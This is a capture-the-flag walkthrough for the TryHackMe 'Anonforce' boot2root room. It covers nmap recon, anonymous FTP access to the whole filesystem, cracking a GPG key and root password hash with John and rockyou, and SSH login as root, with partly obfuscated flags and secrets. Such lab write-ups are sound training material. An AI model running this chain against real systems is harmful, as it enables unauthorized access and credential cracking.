# BSidesGT: Anonforce

Room: https://tryhackme.com/room/bsidesgtanonforce

boot2root machine for FIT and bsides guatemala CTF

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: h[ttps://github.com/garthheff/CTF-Hints/](https://github.com/garthheff/CTF-Hints/blob/main/Anonforce.md

---

## Overview

This room focuses on:
- FTP misconfiguration (anonymous access)
- Sensitive file exposure
- GPG key cracking
- Hash cracking (John)
- Direct root access

> ⚠️ Note: Flags and hashes in this writeup are intentionally **obfuscated**.

---

## 1. Recon

```bash
nmap -p- -sV <TARGET_IP>
```

### Results:
```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
```

---

## 2. FTP Access (Anonymous Login)

```bash
ftp <TARGET_IP>
```

Login:
```
Username: anonymous
Password: (leave blank)
```

✔ Successful login

---

## 3. Enumerating FTP

```bash
ls
```

👉 Full filesystem is exposed (not jailed)

---

## 4. User Flag

```bash
cd /home
ls
cd melodias
get user.txt
cat user.txt
```

```
6060xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

---

## 5. Interesting Directory Discovery

```bash
cd /
ls
```

👉 Found:

```
notread
```

---

## 6. Sensitive Files Found

```bash
cd notread
ls
```

```
backup.pgp
private.asc
```

Download:

```bash
get backup.pgp
get private.asc
```

---

## 7. Crack GPG Private Key

```bash
/usr/local/bin/gpg2john private.asc > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:

```
xboxxxx
```

---

## 8. Decrypt Backup

```bash
gpg --import private.asc
gpg --decrypt backup.pgp
```

Passphrase:

```
xboxxxx
```

---

## 9. Extracted Data

```
root:$6$07nYFaYf$F4VMaegm...
melodias:$1$xDhc6S6G$IQHUW5...
```

---

## 10. Crack Root Password

```bash
nano root.txt
```

```
root:$6$07nYFaYf$F4VMaegm...
```

```bash
john root.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt
```

Result:

```
hikxxx
```

---

## 11. Root Access

```bash
ssh root@<TARGET_IP>
```

Password:

```
hikxxx
```

---

## 12. Root Flag

```bash
cd /root
cat root.txt
```

```
f7064xxxxxxxxxxxxxxxxx
```

---

## Key Takeaways

- Anonymous FTP exposing `/` is critical
- Sensitive files must not be world-readable
- GPG keys should be protected
- Weak passwords enable full compromise

---

## Attack Chain Summary

1. Nmap → FTP found  
2. Anonymous login  
3. Enumerate filesystem  
4. Find GPG key + backup  
5. Crack passphrase  
6. Decrypt shadow  
7. Crack root hash  
8. SSH as root  

---

## Completed

- User flag ✔  
- Root flag ✔  
